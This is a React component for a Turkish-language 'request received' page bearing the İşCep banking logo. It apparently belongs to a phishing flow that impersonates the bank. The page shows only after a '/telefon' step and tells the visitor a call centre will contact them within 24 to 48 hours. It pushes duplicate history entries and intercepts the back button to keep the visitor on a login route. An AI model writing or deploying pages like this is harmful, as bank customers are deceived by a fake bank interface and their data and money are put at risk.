import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import './App.css';

function WaitingPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);

  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  useEffect(() => {
    const isValidNavigation = location.state?.isValidNavigation && location.state?.from === '/telefon';
    const isCompleted = location.state?.isCompleted;

    if (!isValidNavigation) {
      if (isMobile) {
        setIsLoading(true);
        setTimeout(() => {
          window.history.replaceState(null, '', '/giris');
          navigate('/giris', { replace: true });
        }, 1500);
      } else {
        window.history.replaceState(null, '', '/giris');
        navigate('/giris', { replace: true });
      }
    } else if (isCompleted) {
      setIsLoading(false);

      const handlePopState = () => {
        window.history.replaceState(null, '', '/giris');
        navigate('/giris', { replace: true });
      };

      window.history.pushState(null, '', '/giris');
      window.history.pushState(null, '', '/giris');

      window.addEventListener('popstate', handlePopState);
      return () => window.removeEventListener('popstate', handlePopState);
    }
  }, [location.state, navigate, isMobile]);

  // Tüm tarayıcılarda (özellikle iOS Chrome ve Safari'de) scroll'u en üste kaydır
  useEffect(() => {
    const isIphone = /iPhone/i.test(navigator.userAgent);
    if (isIphone) {
      // Cross-browser scroll to top fonksiyonu
      const scrollToTop = () => {
        window.scrollTo({ top: 0, left: 0, behavior: 'auto' }); // Smooth yerine auto kullan, sorunları önler
        document.body.scrollTop = 0; // Safari için
        document.documentElement.scrollTop = 0; // Chrome, Firefox vb. için
      };

      // Sayfa yüklendiğinde hemen çağır
      scrollToTop();

      // Gecikmeli çağır (adres çubuğu veya klavye etkisi için)
      setTimeout(scrollToTop, 0);
      setTimeout(scrollToTop, 300); // iOS Chrome için ekstra gecikme
      setTimeout(scrollToTop, 500);

      // requestAnimationFrame ile dene
      requestAnimationFrame(scrollToTop);
    }
  }, []);

  if (isLoading && isMobile) {
    return (
      <div className="waiting-overlay">
        <div className="waiting-container">
          <img src="/check.png" alt="Check Logo" className="waiting-logo" />
          <p className="waiting-text">Lütfen Bekleyin</p>
        </div>
      </div>
    );
  }

  return (
    <div className="container">
      <div className="bekleme-content">
        <img src="/iscep-logo.png" alt="İşCep Logo" className="bekleme-iscep-logo" />
        <img src="/check.png" alt="Check Logo" className="bekleme-check-logo" />
        <p className="waiting-message">
          Talebiniz başarıyla alındı.
          Çağrı Merkezimiz sizinle 24 ila 48 saat
          içinde iletişime geçecektir.
        </p>
      </div>
    </div>
  );
}

export default WaitingPage;
